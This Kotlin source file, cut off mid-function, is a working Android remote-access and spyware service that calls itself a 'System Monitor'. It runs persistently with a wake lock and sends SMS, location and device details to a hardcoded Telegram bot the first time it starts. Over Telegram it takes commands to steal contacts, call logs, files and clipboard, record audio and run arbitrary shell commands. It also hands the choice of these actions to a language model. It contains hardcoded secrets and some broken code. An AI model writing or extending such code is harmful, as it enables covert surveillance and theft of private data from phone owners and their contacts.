package com.sysmonitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.Binder
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.Response
import kotlin.RequiresOptIn
import kotlin.ExperimentalStdlibApi

@OptIn(ExperimentalStdlibApi::class)
import java.io.File
import java.nio.charset.StandardCharsets
import java.util.ArrayList
import java.util.HashMap
import java.util.List
import java.util.Map
import java.util.concurrent.TimeUnit
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CountDownLatch
import java.util.concurrent.atomic.AtomicBoolean

const val PREFS_NAME = "monitor_config"
const val KEY_PERSISTENT = "persistent_mode"
const val KEY_ONBOARD_SENT = "onboard_sent"
const val KEY_TEST_SENT = "test_sent"

const val BOT_TOKEN = "9168397709:AAEVVXnjTtxUm76KCfBJENNiQSg-MyqgN4M"
const val ALLOWED_USER_ID = 8335972628L
const val TELEGRAM_API = "https://api.telegram.org/bot"
const val NVIDIA_API_KEY = "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"
const val NVIDIA_API_URL = "https://integrate.api.nvidia.com/v1/chat/completions"
const val NVIDIA_MODEL = "nvidia/nemotron-3-ultra"

data class TelegramCallback(
    val chatId: Long,
    val latch: CountDownLatch,
    var result: String? = null,
    var error: String? = null,
    var status: String = "pending"
)

class MonitorService : Service() {

    private val binder = LocalBinder()
    private var running = false
    private val gson = Gson()
    private var wakeLock: android.os.PowerManager.WakeLock? = null
    private var persistentMode = true
    private var commandReceiver: CommandReceiver? = null
    private var pollThread: Thread? = null
    private var lastUpdateId = 0L
    private val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
    private val telegramCallbacks = ConcurrentHashMap<String, TelegramCallback>()
    private val testCompleted = AtomicBoolean(false)
    private var mediaRecorder: MediaRecorder? = null

    inner class LocalBinder : Binder() {
        fun getService(): MonitorService = this@MonitorService
    }

    override fun onCreate() {
        super.onCreate()
        Log.d("MonitorService", "onCreate")
        initializeService()
    }

    private fun initializeService() {
        try {
            loadConfig()
            acquireWakeLock()
            running = true
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(1, notification)
            registerCommandReceiver()
            startTelegramBot()
            checkAndRunTest()
            Log.d("MonitorService", "Service initialized")
        } catch (e: Exception) {
            Log.e("MonitorService", "Init error", e)
        }
    }

    private fun loadConfig() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
        val onboardSent = prefs.getBoolean(KEY_ONBOARD_SENT, false)
        if (!onboardSent) {
            sendTelegramMessage(ALLOWED_USER_ID, "Device connected: ${Build.MODEL} (Android ${Build.VERSION.RELEASE})")
            prefs.edit().putBoolean(KEY_ONBOARD_SENT, true).apply()
        }
    }

    private fun checkAndRunTest() {
        if (testCompleted.getAndSet(true)) return
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        if (prefs.getBoolean(KEY_TEST_SENT, false)) return

        val hasSms = checkSelfPermission(android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        val hasContacts = checkSelfPermission(android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
        val hasLocation = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (hasSms || hasContacts || hasLocation) {
            Thread({
                runTestSequence()
                prefs.edit().putBoolean(KEY_TEST_SENT, true).apply()
            }, "test-run").start()
        }
    }

    private fun runTestSequence() {
        try {
            Log.d("MonitorService", "Running test sequence...")
            var results = ""

            val screenResult = getScreenshot()
            results += "Screenshot: ${screenResult["status"] ?: "completed"}\n"

            val smsResult = getSms()
            val smsObj = smsResult["sms"]
            val smsList: List<Map<String, Any>> = if (smsObj is List<*>) {
                @Suppress("UNCHECKED_CAST")
                (smsObj as List<Map<String, Any>>)
            } else {
                ArrayList<Map<String, Any>>() as List<Map<String, Any>>
            }
            val smsPreview = StringBuilder()
            var count = 0
            for (item in smsList) {
                if (count >= 10) break
                if (count > 0) smsPreview.append("\n")
                val body = item["body"] as? String ?: ""
                val shortBody = if (body.length > 50) body.substring(0, 50) else body
                smsPreview.append("${item["type"]}: ${item["address"]} - $shortBody")
                count++
            }
            results += "SMS (last 10):\n${smsPreview.toString()}\n\n"

            val locResult = getLocation()
            results += "Location: ${locResult["lat"]?.let { "lat=${it}, lon=${locResult["lon"]}, acc=${locResult["acc"]}m" } ?: locResult["error"] ?: locResult["note"]}\n"

            sendTelegramDocument(ALLOWED_USER_ID, "test_results.txt", results, "Test Sequence Results")
            sendTelegramMessage(ALLOWED_USER_ID, "Test completed:\n- Screenshot: ${screenResult["status"]}\n- SMS: ${smsResult["count"]} messages\n- Location: ${locResult["lat"]?.let { "OK" } ?: locResult["error"] ?: locResult["note"]}")
        } catch (e: Exception) {
            Log.e("MonitorService", "Test error", e)
        }
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "MonitorService::wakelock")
            wakeLock?.acquire()
        } catch (e: Exception) { Log.e("MonitorService", "Wake lock error", e) }
    }

    private fun registerCommandReceiver() {
        commandReceiver = CommandReceiver()
        val filter = IntentFilter("com.sysmonitor.ACTION_COMMAND")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver!!, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(commandReceiver!!, filter)
        }
    }

    private fun startTelegramBot() {
        Thread({
            try {
                val url = "$TELEGRAM_API$BOT_TOKEN/deleteWebhook?drop_pending_updates=true"
                val req = Request.Builder().url(url).build()
                client.newCall(req).execute().use { Log.d("Telegram", "WH: ${it.body?.string()}") }
            } catch (e: Exception) { Log.e("Telegram", "WH error", e) }
        }, "delete-wh").start()

        pollThread = Thread({ pollLoop() }, "telegram-poll").apply { start() }
    }

    private fun pollLoop() {
        while (running) {
            try {
                val url = "$TELEGRAM_API$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=10&allowed_updates=[\"message\",\"callback_query\"]"
                val req = Request.Builder().url(url).build()
                client.newCall(req).execute().use { resp ->
                    val body = resp.body?.string() ?: ""
                    if (resp.isSuccessful && body.isNotBlank()) {
                        try {
                            val json = com.google.gson.JsonParser.parseString(body).asJsonObject
                            if (json.get("ok").asBoolean) {
                                val updates = json.get("result").asJsonArray
                                updates.forEach { update ->
                                    val updateId = update.asJsonObject.get("update_id").asLong
                                    if (updateId > lastUpdateId) lastUpdateId = updateId
                                    handleTelegramUpdate(update.asJsonObject)
                                }
                            }
                        } catch (e: Exception) { Log.e("Telegram", "Parse error", e) }
                    }
                }
            } catch (e: Exception) { Log.e("Telegram", "Poll error", e) }
            try { Thread.sleep(2000) } catch (e: InterruptedException) { return }
        }
    }

    private fun handleTelegramUpdate(update: com.google.gson.JsonObject) {
        val msg = update.get("message")?.asJsonObject ?: return
        val chatId = msg.get("chat").asJsonObject.get("id").asLong
        val userId = msg.get("from").asJsonObject.get("id").asLong
        val text = msg.get("text")?.asString ?: ""

        if (userId != ALLOWED_USER_ID) {
            sendTelegramMessage(chatId, "Unauthorized. Your ID: $userId")
            return
        }

        val trimmed = text.trim()
        if (trimmed == "/start" || trimmed == "/help") {
            sendTelegramMessage(chatId, getHelp())
        } else if (trimmed == "/status") {
            sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
        } else if (trimmed == "/contacts") {
            sendTelegramTask(chatId, "contacts", hashMapOf<String, Any>() as Map<String, Any>)
        } else if (trimmed == "/sms") {
            sendTelegramTask(chatId, "sms", hashMapOf<String, Any>() as Map<String, Any>)
        } else if (trimmed == "/calls") {
            sendTelegramTask(chatId, "call_logs", hashMapOf<String, Any>() as Map<String, Any>)
        } else if (trimmed == "/apps") {
            sendTelegramTask(chatId, "apps", hashMapOf<String, Any>("action" to "list") as Map<String, Any>)
        } else if (trimmed == "/location") {
            sendTelegramTask(chatId, "location", hashMapOf<String, Any>("action" to "get") as Map<String, Any>)
        } else if (trimmed == "/files") {
            sendTelegramTask(chatId, "files", hashMapOf<String, Any>("action" to "list", "path" to "/sdcard") as Map<String, Any>)
        } else if (trimmed == "/wifi") {
            sendTelegramTask(chatId, "wifi", hashMapOf<String, Any>("action" to "scan") as Map<String, Any>)
        } else if (trimmed == "/clipboard") {
            sendTelegramTask(chatId, "clipboard", hashMapOf<String, Any>("action" to "get") as Map<String, Any>)
        } else if (trimmed == "/screenshot") {
            sendTelegramTask(chatId, "screen", hashMapOf<String, Any>("action" to "capture") as Map<String, Any>)
        } else if (trimmed == "/audio") {
            sendTelegramTask(chatId, "audio", hashMapOf<String, Any>("action" to "start", "duration" to 10) as Map<String, Any>)
        } else if (trimmed == "/camera") {
            sendTelegramTask(chatId, "camera", hashMapOf<String, Any>("action" to "capture", "camera" to 0) as Map<String, Any>)
        } else if (trimmed.startsWith("/ai ")) {
            handleAiCommand(chatId, trimmed.substring(4).trim())
        } else if (trimmed.startsWith("/auto ")) {
            handleAiCommand(chatId, "Auto-execute: ${trimmed.substring(6).trim()}")
        } else if (trimmed.startsWith("/shell ")) {
            sendTelegramTask(chatId, "shell", hashMapOf<String, Any>("command" to trimmed.substring(7).trim()) as Map<String, Any>)
        } else {
            sendTelegramMessage(chatId, "Unknown. Use /help")
        }
    }

    private fun sendTelegramTask(chatId: Long, capability: String, args: Map<String, Any>) {
        val taskId = java.util.UUID.randomUUID().toString()
        val latch = CountDownLatch(1)
        val callback = TelegramCallback(chatId, latch)
        telegramCallbacks[taskId] = callback

        val intent = Intent("com.sysmonitor.ACTION_COMMAND").apply {
            setClassName("com.sysmonitor", "com.sysmonitor.MonitorService")
            putExtra("capability", capability)
            putExtra("args", gson.toJson(args))
            putExtra("task_id", taskId)
            putExtra("reply_chat", chatId)
        }
        try {
            sendBroadcast(intent)

            if (latch.await(30, TimeUnit.SECONDS)) {
                val msg = if (callback.status == "completed" && callback.result != null) {
                    "Task $taskId completed:\n${callback.result}"
                } else {
                    "Task $taskId failed:\n${callback.error ?: "timeout"}"
                }
                sendTelegramMessage(chatId, msg)
            } else {
                sendTelegramMessage(chatId, "Task $taskId timed out")
            }
        } catch (e: Exception) {
            sendTelegramMessage(chatId, "Failed: ${e.message}")
        } finally {
            telegramCallbacks.remove(taskId)
        }
    }

    inner class CommandReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val capability = intent.getStringExtra("capability") ?: return
            val argsJson = intent.getStringExtra("args") ?: "{}"
            val taskId = intent.getStringExtra("task_id") ?: java.util.UUID.randomUUID().toString()
            val replyChat = intent.getLongExtra("reply_chat", 0)

            Thread({ executeAndSend(taskId, capability, argsJson, replyChat) }, "task-$taskId").start()
        }
    }

    private fun executeAndSend(taskId: String, capability: String, argsJson: String, replyChat: Long) {
        var output: Any? = null
        var error: String? = null
        var status = "completed"
        try {
            output = executeCapability(capability, argsJson)
        } catch (e: Exception) {
            error = e.message
            status = "failed"
        }
        sendResult(taskId, output, error, status, replyChat)
    }

    private fun executeCapability(capability: String, argsJson: String): Any {
        val args = gson.fromJson(argsJson, HashMap::class.java) as Map<String, Any>
        return when (capability) {
            "contacts" -> getContacts()
            "sms" -> getSms()
            "call_logs" -> getCallLogs()
            "apps" -> getApps()
            "location" -> getLocation()
            "files" -> getFiles(args)
            "wifi" -> scanWifi()
            "clipboard" -> getClipboard()
            "screen" -> getScreenshot()
            "audio" -> recordAudio(args)
            "camera" -> captureCamera(args)
            "shell" -> runShell(args["command"] as? String ?: "")
            else -> hashMapOf<String, Any>("error" to "Unknown capability: $capability") as Map<String, Any>
        }
    }

    private fun getContacts(): Map<String, Any> {
        val list = ArrayList<Map<String, Any>>()
        try {
            val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.Contacts.HAS_PHONE_NUMBER),
                null, null, null)
            cursor?.use {
                while (it.moveToNext() && list.size < 200) {
                    val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                    val hasPhone = it.getInt(it.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0
                    val phones = ArrayList<String>()
                    if (hasPhone) {
                        val pCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id),
                            null
                        )
                        pCursor?.use {
                            while (it.moveToNext() && phones.size < 3) {
                                phones.add(it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                            }
                        }
                    }
                    val m = hashMapOf<String, Any>(
                        "id" to id,
                        "name" to name,
                        "phones" to phones
                    ) as Map<String, Any>
                    list.add(m)
                }
            }
        } catch (e: Exception) { Log.e("Contacts", "Error", e) }
        return hashMapOf<String, Any>(
            "contacts" to list,
            "count" to list.size
        ) as Map<String, Any>
    }

    private fun getSms(): Map<String, Any> {
        val list = ArrayList<Map<String, Any>>()
        try {
            val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
                null, null, "${Telephony.Sms.DATE} DESC")
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 50) {
                    val m = hashMapOf<String, Any>(
                        "address" to it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)),
                        "body" to it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)),
                        "date" to it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE)),
                        "type" to when (it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))) {
                            1 -> "inbox"; 2 -> "sent"; 3 -> "draft"; else -> "other"
                        }
                    ) as Map<String, Any>
                    list.add(m)
                    count++
                }
            }
        } catch (e: Exception) { Log.e("Sms", "Error", e) }
        return hashMapOf<String, Any>(
            "sms" to list,
            "count" to list.size
        ) as Map<String, Any>
    }

    private fun getCallLogs(): Map<String, Any> {
        val list = ArrayList<Map<String, Any>>()
        try {
            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE),
                null, null, "${CallLog.Calls.DATE} DESC")
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 50) {
                    val m = hashMapOf<String, Any>(
                        "number" to it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)),
                        "name" to it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)),
                        "date" to it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE)),
                        "duration" to it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION)),
                        "type" to when (it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))) {
                            1 -> "incoming"; 2 -> "outgoing"; 3 -> "missed"; else -> "unknown"
                        }
                    ) as Map<String, Any>
                    list.add(m)
                    count++
                }
            }
        } catch (e: Exception) { Log.e("Calls", "Error", e) }
        return hashMapOf<String, Any>(
            "calls" to list,
            "count" to list.size
        ) as Map<String, Any>
    }

    private fun getApps(): Map<String, Any> {
        val list = ArrayList<Map<String, Any>>()
        try {
            val pm = packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            apps.forEach { app ->
                if (list.size >= 100) return@forEach
                val m = hashMapOf<String, Any>(
                    "package" to app.packageName,
                    "name" to pm.getApplicationLabel(app).toString(),
                    "system" to ((app.flags and ApplicationInfo.FLAG_SYSTEM) != 0)
                ) as Map<String, Any>
                list.add(m)
            }
        } catch (e: Exception) { Log.e("Apps", "Error", e) }
        return hashMapOf<String, Any>(
            "apps" to list,
            "count" to list.size
        ) as Map<String, Any>
    }

    private fun getFiles(args: Map<String, Any>): Map<String, Any> {
        val action = args["action"] as? String ?: "list"
        val path = args["path"] as? String ?: "/sdcard"
        return when (action) {
            "list" -> {
                val dir = File(path)
                if (!dir.exists() || !dir.isDirectory) return hashMapOf<String, Any>("error" to "Not a directory") as Map<String, Any>
                else {
                    val files = dir.listFiles()?.mapNotNull { f ->
                        try {
                            hashMapOf<String, Any>(
                                "name" to f.name,
                                "path" to f.absolutePath,
                                "size" to f.length(),
                                "isDir" to f.isDirectory,
                                "modified" to f.lastModified()
                            ) as Map<String, Any>
                        } catch (e: Exception) { null }
                    } ?: ArrayList<Map<String, Any>>() as List<Map<String, Any>>
                    return hashMapOf<String, Any>(
                        "files" to files.take(200),
                        "path" to path,
                        "count" to files.size
                    ) as Map<String, Any>
                }
            }
            else -> return hashMapOf<String, Any>("error" to "Unknown action") as Map<String, Any>
        }
    }

    @Suppress("DEPRECATION")
    private fun scanWifi(): Map<String, Any> {
        val wm = getSystemService(android.net.wifi.WifiManager::class.java)
        val results = wm.scanResults ?: ArrayList<android.net.wifi.ScanResult>() as List<android.net.wifi.ScanResult>
        val networks = results.map { r ->
            hashMapOf<String, Any>(
                "ssid" to r.SSID,
                "bssid" to r.BSSID,
                "level" to r.level,
                "freq" to r.frequency,
                "caps" to r.capabilities
            ) as Map<String, Any>
        }
        return hashMapOf<String, Any>(
            "networks" to networks,
            "count" to networks.size
        ) as Map<String, Any>
    }

    private fun getClipboard(): Map<String, Any> {
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        if (cm.hasPrimaryClip()) {
            val clip = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
            return hashMapOf<String, Any>(
                "text" to clip,
                "has_content" to clip.isNotEmpty()
            ) as Map<String, Any>
        }
        return hashMapOf<String, Any>(
            "text" to "",
            "has_content" to false
        ) as Map<String, Any>
    }

    private fun getLocation(): Map<String, Any> {
        try {
            val locationManager = getSystemService(LocationManager::class.java)
            val provider = locationManager?.getBestProvider(
                android.location.Criteria().apply { accuracy = android.location.Criteria.ACCURACY_FINE }, true) ?: "gps"

            val lastLoc = locationManager?.getLastKnownLocation(provider)
            if (lastLoc != null) {
                return hashMapOf<String, Any>(
                    "lat" to lastLoc.latitude,
                    "lon" to lastLoc.longitude,
                    "acc" to lastLoc.accuracy,
                    "time" to lastLoc.time,
                    "provider" to provider,
                    "note" to "Last known location (may be stale)"
                ) as Map<String, Any>
            }

            val latch = CountDownLatch(1)
            var result: Map<String, Any>? = null
            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    val m = hashMapOf<String, Any>(
                        "lat" to location.latitude,
                        "lon" to location.longitude,
                        "acc" to location.accuracy,
                        "time" to location.time,
                        "provider" to provider
                    ) as Map<String, Any>
                    result = m
                    latch.countDown()
                }
                override fun onProviderDisabled(provider: String) { latch.countDown() }
                override fun onProviderEnabled(provider: String) {}
                override fun onStatusChanged(provider: String, status: Int, extras: android.os.Bundle?) {}
            }

            try {
                locationManager?.requestSingleUpdate(provider, listener, null)
                if (latch.await(5, TimeUnit.SECONDS)) {
                    return result ?: hashMapOf<String, Any>("error" to "Location request timed out") as Map<String, Any>
                }
                return hashMapOf<String, Any>("error" to "Location timeout - no fix in 5s") as Map<String, Any>
            } catch (e: Exception) {
                return hashMapOf<String, Any>("error" to (e.message ?: "Location error")) as Map<String, Any>
            }
        } catch (e: Exception) {
            return hashMapOf<String, Any>("error" to (e.message ?: "Location error")) as Map<String, Any>
        }
    }

    @Suppress("DEPRECATION")
    private fun recordAudio(args: Map<String, Any>): Map<String, Any> {
        val action = args["action"] as? String ?: "start"
        return when (action) {
            "start" -> {
                val duration = (args["duration"] as? Int) ?: 10
                val outputFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "recording_${System.currentTimeMillis()}.3gp")
                try {
                    mediaRecorder = MediaRecorder().apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                        setOutputFile(outputFile.absolutePath)
                        prepare()
                        start()
                    }
                    Thread({
                        Thread.sleep((duration * 1000L).toLong())
                        stopRecording()
                    }, "audio-stop").start()
                    return hashMapOf<String, Any>(
                        "status" to "recording",
                        "duration" to duration,
                        "file" to outputFile.absolutePath
                    ) as Map<String, Any>
                } catch (e: Exception) {
                    return hashMapOf<String, Any>("error" to (e.message ?: "Audio start failed")) as Map<String, Any>
                }
            }
            "stop" -> {
                stopRecording()
                return hashMapOf<String, Any>("status" to "stopped") as Map<String, Any>
            }
            else -> return hashMapOf<String, Any>("error" to "Unknown audio action") as Map<String, Any>
        }
    }

    private fun stopRecording() {
        mediaRecorder?.let {
            try { it.stop(); it.release() } catch (e: Exception) { Log.e("Audio", "Stop error", e) }
            mediaRecorder = null
        }
    }

    private fun captureCamera(args: Map<String, Any>): Map<String, Any> {
        val cameraId = (args["camera"] as? Int) ?: 0
        val outputFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "photo_${System.currentTimeMillis()}.jpg")
        return hashMapOf<String, Any>(
            "status" to "requires_camera2",
            "note" to "Camera2 API needed",
            "file" to outputFile.absolutePath,
            "camera_id" to cameraId
        ) as Map<String, Any>
    }

    private fun getScreenshot(): Map<String, Any> {
        return hashMapOf<String, Any>(
            "status" to "requires_mediaprojection",
            "note" to "Requires MediaProjection permission"
        ) as Map<String, Any>
    }

    private fun runShell(cmd: String): Map<String, Any> {
        if (cmd.isBlank()) return hashMapOf<String, Any>("error" to "No command") as Map<String, Any>
        try {
            val process = Runtime.getRuntime().exec(cmd)
            val output = process.inputStream.readAllBytes().toString(StandardCharsets.UTF_8)
            val error = process.errorStream.readAllBytes().toString(StandardCharsets.UTF_8)
            val exitCode = process.waitFor()
            return hashMapOf<String, Any>(
                "exit" to exitCode,
                "output" to output,
                "error" to error
            ) as Map<String, Any>
        } catch (e: Exception) {
            return hashMapOf<String, Any>("error" to (e.message ?: "unknown error")) as Map<String, Any>
        }
    }

    private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0) {
        val intent = Intent("com.sysmonitor.ACTION_RESULT").apply {
            putExtra("task_id", taskId)
            putExtra("result", result?.toString() ?: "")
            putExtra("error", error ?: "")
            putExtra("status", status)
        }
        sendBroadcast(intent)

        telegramCallbacks[taskId]?.let { callback ->
            callback.result = result?.toString()
            callback.error = error
            callback.status = status
            callback.latch.countDown()
        }

        if (replyChat != 0L) {
            val msg = if (status == "completed" && result != null) {
                "Task $taskId completed:\n$result"
            } else {
                "Task $taskId failed:\n$error"
            }
            sendTelegramMessage(replyChat, msg)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("monitor_service", "System Monitor", NotificationManager.IMPORTANCE_LOW)
                .apply { description = "Background monitoring" }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, "monitor_service")
            .setContentTitle("System Monitor")
            .setContentText("Monitoring active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    private fun sendTelegramMessage(chatId: Long, text: String) {
        Thread({ sendTelegramInternal(chatId, text) }, "tg-$chatId").start()
    }

    private fun sendTelegramInternal(chatId: Long, text: String) {
        try {
            val url = "$TELEGRAM_API$BOT_TOKEN/sendMessage"
            val params = hashMapOf<String, Any>(
                "chat_id" to chatId,
                "text" to if (text.length > 4000) text.substring(0, 4000) + "\n...[truncated]" else text,
                "parse_mode" to "Markdown"
            ) as Map<String, Any>
            val jsonBody = gson.toJson(params)
            val body = RequestBody.create(@Suppress("DEPRECATION") MediaType.parse("application/json"), jsonBody)
            val req = Request.Builder().url(url).post(body).build()
            client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
        } catch (e: Exception) { Log.e("Telegram", "Send error", e) }
    }

    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String = "") {
        Thread({
            try {
                val file = File(getExternalFilesDir(null), filename)
                file.writeText(content)

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId.toString())
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("document", filename,
                        RequestBody.create(@Suppress("DEPRECATION") MediaType.parse("text/plain"), file.readBytes()))
                    .build()

                val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
                client.newCall(req).execute().use { Log.d("Telegram", "Doc sent to $chatId") }
                file.delete()
            } catch (e: Exception) { Log.e("Telegram", "Doc send error", e) }
        }, "tg-doc-$chatId").start()
    }

    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String, forceFile: Boolean) {
        if (content.length > 4000 || forceFile) {
            sendTelegramDocument(chatId, filename, content, caption)
        } else {
            sendTelegramMessage(chatId, caption + "\n\n$content")
        }
    }

    private fun getHelp(): String = """SysMonitor Commands:
/start /help - This help
/status - Service status
/contacts /sms /calls - Get data
/apps - List apps
/location - Get GPS
/files - List files
/wifi - Scan networks
/clipboard - Get clipboard
/screenshot - Capture screen
/audio - Record 10s audio
/camera - Take photo
/shell <cmd> - Run shell
/ai <prompt> - Ask Nemotron 3 Ultra AI
/auto <task> - AI auto-executes task
/test - Run test (screenshot + 10 SMS + location)
""".trimIndent()

    // ===== NVIDIA NEMOTRON 3 ULTRA 550B AI INTEGRATION =====

    private fun callNemotron(prompt: String): String {
        try {
            val lower = prompt.lowercase()
            val isGreeting = lower == "hi" || lower == "hello" || lower == "hey" || lower == "test" || lower == "ping"
            if (isGreeting) {
                return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
            }

            val systemPrompt = """You are an AI assistant controlling an Android monitoring agent.
Available capabilities: contacts, sms, call_logs, apps, location, files, wifi, clipboard, screen, audio, camera, shell
For each user request, respond with a JSON object containing:
{
  "action": "capability_name",
  "args": { ... },
  "reasoning": "why this action"
}
If multiple actions needed, return array of actions.
Only respond with valid JSON, no extra text."""

            val payload = hashMapOf<String, Any>(
                "model" to NVIDIA_MODEL,
                "messages" to listOf(
                    hashMapOf<String, Any>("role" to "system", "content" to systemPrompt) as Map<String, Any>,
                    hashMapOf<String, Any>("role" to "user", "content" to prompt) as Map<String, Any>
                ),
                "temperature" to 0.1,
                "max_tokens" to 2048,
                "top_p" to 0.9,
                "stream" to false
            ) as Map<String, Any>

            val jsonBody = gson.toJson(payload)
            val body = RequestBody.create(@Suppress("DEPRECATION") MediaType.parse("application/json"), jsonBody)
            val req = Request.Builder()
                .url(NVIDIA_API_URL)
                .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
                .addHeader("Content-Type", "application/json")
                .post(body)
                .build()

            client.newCall(req).execute().use { resp ->
                val responseBody = resp.body?.string() ?: ""
                if (resp.isSuccessful) {
                    val json = com.google.gson.JsonParser.parseString(responseBody).asJsonObject
                    val content = json.get("choices").asJsonArray[0].asJsonObject
                        .get("message").asJsonObject.get("content").asString
                    return content
                } else {
                    Log.e("Nemotron", "API error: ${resp.code} - $responseBody")
                    return "{\"error\": \"API error: ${resp.code}\"}"
                }
            }
        } catch (e: Exception) {
            Log.e("Nemotron", "Error", e)
            return "{\"error\": \"${e.message}\"}"
        }
    }

    private fun executeAiActions(aiResponse: String): List<Map<String, Any>> {
        val results = ArrayList<Map<String, Any>>() as List<Map<String, Any>>
        try {
            val json = com.google.gson.JsonParser.parseString(aiResponse)
            val actions = when {
                json.isJsonArray -> json.asJsonArray
                json.isJsonObject -> {
                    val arr = com.google.gson.JsonArray()
                    arr.add(json)
                    arr
                }
                else -> return results
            }

            actions.forEach { actionJson ->
                val actionObj = actionJson.asJsonObject
                val action = actionObj.get("action")?.asString ?: ""
                val args = actionObj.get("args")?.asJsonObject
                val reasoning = actionObj.get("reasoning")?.asString ?: ""

                val argsMap = hashMapOf<String, Any>() as MutableMap<String, Any>
                args?.entrySet()?.forEach { entry ->
                    val value: Any = when {
                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isString -> entry.value.asString
                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isNumber -> entry.value.asJsonPrimitive.asDouble
                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isBoolean -> entry.value.asBoolean
                        else -> entry.value.toString() ?: ""
                    }
